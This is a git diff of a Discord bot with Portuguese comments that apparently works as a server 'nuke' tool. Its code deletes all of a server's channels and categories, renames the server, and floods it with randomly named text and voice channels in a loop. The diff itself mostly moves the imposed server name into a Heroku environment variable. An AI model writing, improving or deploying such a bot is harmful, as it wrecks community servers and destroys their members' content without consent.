@@ -34,10 +34,10 @@ client.on("message", async (message) => {
 	.catch(err => {                                                                            //se der erro...
 		return;                                                                            //...vai retornar nada
 	});
-	    message.guild.setName('uísque best waifu owu')                                           //muda o nome do sv pra esse nome ae owu
+	    message.guild.setName(process.env.SERVER_NAME)                                         //muda o nome do sv pra um nome colocado no site do host heroku
 	    const textuh = makeid(32);                                                             //cria uma variavel string usando aquela function ali em cima
 	    message.guild.createChannel(`${textuh}`, 'text')                                       //cria um canal com o nome a variavel textuh
-	    message.guild.createChannel(`${textuh}`, 'voice');                                       //cria um canal de texto com o nome a var textuh
+	    message.guild.createChannel(`${textuh}`, 'voice');                                     //cria um canal de texto com o nome a var textuh
 	if(message.guild.channels > 499) break;
        }
     }
@@ -47,11 +47,11 @@ client.on("message", async (message) => {
         server.deleteAll()                                                                         //deleta todos os canais e categorias do sv
         const texth = makeid(32);                                                                  //cria outra variavel usando aquela function ali
 	    message.guild.createChannel(`${texth}`, 'text');                                       //cria um canal de texto com o nome a var texth	
-	    message.guild.setName('uísque best waifu owu')                                         //coloca o nome do sv esse ae uwu
+	    message.guild.setName(process.env.SERVER_NAME)                                         //coloca o nome do sv pra um nome colocado no site do host heroku
     }
 });
 
-client.login(process.env.BOT_TOKEN);                                                                        //loga no bot pra poder executar td isso
+client.login(process.env.BOT_TOKEN);                                                               //loga no bot pra poder executar td isso
 
 //para de olhar aqui poha
 //- mene paradino
